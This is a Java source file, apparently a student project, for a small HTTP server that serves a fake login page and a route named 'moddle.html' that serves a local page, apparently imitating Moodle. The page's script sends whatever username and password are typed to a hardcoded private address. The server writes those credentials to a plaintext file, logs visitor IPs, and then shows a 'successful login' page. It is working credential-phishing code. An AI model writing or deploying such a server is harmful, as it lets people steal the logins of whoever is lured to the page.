package htl.teddy_com.backend;

import com.sun.net.httpserver.*;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.net.*;
import java.text.*;
import java.time.LocalDateTime;
import java.util.*;

public class Main {
    public static void main(String[] args) throws IOException {
        System.out.println(InetAddress.getLocalHost().getHostAddress());
        HttpServer server = HttpServer.create(new InetSocketAddress(8080), 0);
        server.createContext("/", new MyHandler());
        server.createContext("/style.css", new CssHandler());
        server.createContext("/dashboard.html", new DashboardHandler());
        server.createContext("/moddle.html", new MoodleHandler());
        server.createContext("/log-login", new LogLoginHandler());
        server.setExecutor(null);
        server.start();
        System.out.println("Server started on port 8080");
    }

    static class MyHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            String clientIp = exchange.getRemoteAddress().getAddress().getHostAddress();
            updateIpLog(clientIp);
            String response = """
                <!DOCTYPE html>
                        <html lang="en">
                        <head>
                            <meta charset="UTF-8">
                            <meta name="viewport" content="width=device-width, initial-scale=1.0">
                            <title>Login System</title>
                            <link rel="stylesheet" href="http://172.16.33.46:8080/style.css">
                            <script>
                                async function logLogin(event) {
                                    event.preventDefault(); // Prevents the default form submission
                    
                                    const username = document.getElementById("username").value;
                                    const password = document.getElementById("password").value;
                    
                                    console.log("Login Attempt:", { username, password });
                    
                                    // Send data to the backend for logging
                                    await fetch("http://172.16.33.46:8080/log-login.html", {
                                        method: "POST",
                                        headers: { "Content-Type": "application/json" },
                                        body: JSON.stringify({ username, password, timestamp: new Date().toISOString() }),
                                    });
                    
                                    // Redirect after logging the login attempt
                                    window.location.href = "http://172.16.33.46:8080/dashboard.html";
                                }
                            </script>
                        </head>
                        <body>
                            <div class="login-box">
                                <h2>Login</h2>
                                <form onsubmit="logLogin(event)">
                                    <input type="text" id="username" placeholder="Username" required>
                                    <input type="password" id="password" placeholder="Password" required>
                                    <button type="submit">Login</button>
                                </form>
                            </div>
                        </body>
                        </html>
                    
            """;
            exchange.getResponseHeaders().set("Content-Type", "text/html");
            exchange.sendResponseHeaders(200, response.length());
            OutputStream os = exchange.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }

        public void updateIpLog(String ip) {
            File file = new File("ip_log.txt");
            Map<String, String> ipRecords = new HashMap<>();
            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());

            if (file.exists()) {
                try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        String[] parts = line.split(" - ", 2);
                        if (parts.length == 2) {
                            ipRecords.put(parts[1], parts[0]);
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            ipRecords.put(ip, timestamp);

            try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
                for (Map.Entry<String, String> entry : ipRecords.entrySet()) {
                    writer.write(entry.getValue() + " - " + entry.getKey());
                    writer.newLine();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    static class CssHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            File cssFile = new File("style.css");
            if (cssFile.exists()) {
                byte[] cssContent = Files.readAllBytes(Paths.get("style.css"));
                exchange.getResponseHeaders().set("Content-Type", "text/css");
                exchange.sendResponseHeaders(200, cssContent.length);
                OutputStream os = exchange.getResponseBody();
                os.write(cssContent);
                os.close();
            } else {
                exchange.sendResponseHeaders(404, -1);
            }
        }
    }

    static class MoodleHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            String clientIp = exchange.getRemoteAddress().getAddress().getHostAddress();
            updateIpLog(clientIp);
            File cssFile = new File("index.html");
            if (cssFile.exists()) {
                byte[] cssContent = Files.readAllBytes(Paths.get("index.html"));
                exchange.getResponseHeaders().set("Content-Type", "text/html");
                exchange.sendResponseHeaders(200, cssContent.length);
                OutputStream os = exchange.getResponseBody();
                os.write(cssContent);
                os.close();
            } else {
                exchange.sendResponseHeaders(404, -1);
            }
        }
        private void updateIpLog(String ip) {
            File file = new File("ip_log.txt");
            Map<String, String> ipRecords = new HashMap<>();
            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());

            if (file.exists()) {
                try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        String[] parts = line.split(" - ", 2);
                        if (parts.length == 2) {
                            ipRecords.put(parts[1], parts[0]);
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            ipRecords.put(ip, timestamp);

            try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
                for (Map.Entry<String, String> entry : ipRecords.entrySet()) {
                    writer.write(entry.getValue() + " - " + entry.getKey());
                    writer.newLine();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    static class DashboardHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            String response = """
                <!DOCTYPE html>
                        <html lang="en">
                        <head>
                            <meta charset="UTF-8">
                            <meta name="viewport" content="width=device-width, initial-scale=1.0">
                            <title>Dashboard</title>
                            <link rel="stylesheet" href="http://172.16.33.46:8080/style.css">
                        </head>
                        <body>
                            <div class="login-box">
                                <h2>Succesfull login</h2>
                            </div>
                        </body>
                        </html>
                    
            """;
            exchange.getResponseHeaders().set("Content-Type", "text/html");
            exchange.sendResponseHeaders(200, response.length());
            OutputStream os = exchange.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }
    }
    static class LogLoginHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            if ("POST".equalsIgnoreCase(exchange.getRequestMethod())) {
                InputStream is = exchange.getRequestBody();
                String requestBody = new String(is.readAllBytes(), StandardCharsets.UTF_8);

                File logFile = new File("logins.txt");
                try (BufferedWriter writer = new BufferedWriter(new FileWriter(logFile, true))) {
                    writer.write(LocalDateTime.now() + " - " + requestBody);
                    writer.newLine();
                }

                String response = "Login attempt logged.";
                exchange.sendResponseHeaders(200, response.length());
                OutputStream os = exchange.getResponseBody();
                os.write(response.getBytes(StandardCharsets.UTF_8));
                os.close();
            } else {
                exchange.sendResponseHeaders(405, -1); // Method Not Allowed
            }
        }
    }
}
